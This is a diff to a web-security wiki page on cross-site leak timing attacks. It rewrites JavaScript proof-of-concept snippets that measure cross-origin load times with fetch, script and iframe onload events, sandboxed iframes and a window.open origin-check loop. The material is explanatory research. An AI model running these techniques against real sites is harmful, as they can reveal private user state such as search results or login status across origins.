@@ -38,58 +38,96 @@ Learn more about the different types of clocks in the [Clocks Article]({{< ref "
 The [performance.now()]({{< ref "clocks.md#performancenow" >}}) API can be used to measure how much time it takes to perform a request.
 
 ```javascript
-let before = performance.now()
-await fetch('https://target-website.com',{'mode':'no-cors','credentials':'include'})
-let request_time = performance.now() - before
+// Start the clock
+var start = performance.now()
+
+// Measure how long it takes to complete the fetch requests
+fetch('https://example.org', {
+  mode: 'no-cors',
+  credentials: 'include'
+}).then(() => {
+  // When fetch finishes, calculate the difference
+  var time = performance.now() - start;
+  console.log("The request took %d ms.", time);
+});
 ```
 
-## Frame Timing Attacks (Network)
+## Onload events
 
-If the target page enforces [Framing Protections]({{< ref "../../defenses/opt-in/xfo.md" >}}), embedding it as an `iframe` allows an attacker to obtain a network timing measurement. The example below shows how to achieve this by starting a [clock]({{< ref "clocks.md" >}}), embedding the page as an `iframe` (request is started), and wait for the `onload` event to be triggered which means the request completed. In this scenario when the request completes the browser does not render the fetched resource because of the protection.
+A similar process can be used to measure how long it takes to fetch a resource by simply watching for an onload event.
 
 ```javascript
-begin = performance.now();
-var x = document.createElement('iframe');
-x.src = "https://target.page";
-document.body.appendChild(x);
-start = performance.now();
-x.onload = () => console.log(performance.now() - begin)
+// Create a script element pointing to the page we want to time
+var script = document.createElement('script');
+script.src = "https://example.org";
+document.body.appendChild(script);
+
+// Start the clock
+var start = performance.now();
+
+// When script loads, caculate the time it took to finish the request
+script.onload = () => {
+  var time = performance.now() - start;
+  console.log("The request took %d ms.", time)
+}
 ```
+
+{{< hint good >}}
+A similar technique can be used for other HTML elements, e.g. `<img>`, `<link>`, `<iframe>` which could be used in scenarios where other techniques fail. For example, if [Fetch Metadata]({{< ref "/docs/defenses/opt-in/fetch-metadata.md">}}) blocked loading of a resource into a script tag it may allow it into an image tag. 
+{{< /hint >}}
 
 ## Sandboxed Frame Timing Attacks
 
-When a page sets [Framing Protections]({{< ref "../../defenses/opt-in/xfo.md" >}}), an attacker can obtain an almost pure network measurement by including the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute in the `iframe`. This attribute will block all JavaScript execution and prevent some subresources from loading.
+If a page doesn't have any [Framing Protections]({{< ref "../../defenses/opt-in/xfo.md" >}}) implemented, an attacker can time how long it takes for the page and all subresources to load over the network. By default, the `onload` handler for an iframe will be invoked after all the resources have been loaded and all Javascript has finished executing. But, an attacker can eliminate the noise of script execution by including the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute in the `<iframe>`. This attribute will block a lot of features including Javascript execution, which results in almost pure network measurement.
 
+```javascript
+var iframe = document.createElement('iframe');
+// Set the URL of the destination website
+iframe.src = "https://example.org";
+// Set sandbox attribute to block script execution
+iframe.sandbox = "";
+document.body.appendChild(iframe);
+
+// Measure the time before the request was initiated
+var start = performance.now();
+
+iframe.onload = () => {
+  // When iframe loads, calculate the time difference
+  var time = performance.now() - start;
+  console.log("The iframe and subresources took %d ms to load.", time)
+}
+```
 
 ## Cross-window Timing Attacks
 
-An attacker can also measure the network timing of a page by opening a new window with `window.open` and waiting for the `window` to start loading. The snippet below shows how to make this measurement and works as follows:
+An attacker can also measure the network timing of a page by opening a new window with `window.open` and waiting for the `window` to start loading. The snippet below shows how to make this measurement.
 
-1. The attacker creates an infinite loop of `postMessage` broadcasts to itself while opening a window to the target website (lines 15, 2, 7). The clock is started (line 14).
-2. When the window is created, its location [will be `about:blank`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) until the target page starts loading.
-3. In the infinite loop, the logic clause (line 4) will be `true` while the opened window remains in `about:blank` as its document it's still accessible from the attacker's origin.
-4. When the window starts loading, the location will change from `about:blank` to the target's origin.
-5. The attacker's origin won't have access to the document of the opened window as per Same-Origin Policy. When this occurs, the logic clause (line 4) will fail and throw a `DOMException`.
-6. The attacker catches the Exception and stops the clock.
-
-{{< highlight javascript "linenos=table,linenostart=1" >}}
-let w = 0, end = 0, begin = 0;
-onmessage=()=>{
+```javascript
+// Open a new window to measure when the iframe starts loading
+var win = window.open('https://example.org');
+// Measure the initial time
+var start = performance.now();
+// Define the loop
+function measure(){
   try{
-    if(w && w.document.cookie){
-      // still same origin
-    }
-    postMessage('','*');
+    // If the page has loaded, then it will be on a different origin 
+    // so `win.origin` will throw an exception
+    win.origin;
+    // If the window is still same-origin, immediately repeat the loop but 
+    // without blocking the event loop
+    setTimeout(measure, 0);
   }catch(e){
-    end = performance.now();
-    console.log('time to load was', end - begin);
+    // Once the window has loaded, calculate the time difference
+    var time = performance.now() - start;
+    console.log('It took %d ms to load the window', time);
   }
-};
-postMessage('','*');
-begin = performance.now();
-w = open('//mail.com/search?q=foo');
-{{< / highlight >}}
-
+}
+// Initiate the loop that breaks when the window switches origins
+measure();
+```
+{{< hint info >}}
+Note that this POC uses `setTimeout` in order to create the rough equivalent of a `while(true)` loop. It is necessary to implement this way in order to avoid blocking the JS event loop. 
+{{< /hint >}}
 {{< hint good >}}
 This technique can also be adapted to measure the Execution Timing of a page by [making the event loop busy]({{< ref "execution-timing.md#busy-event-loop" >}}).
 {{< /hint >}}
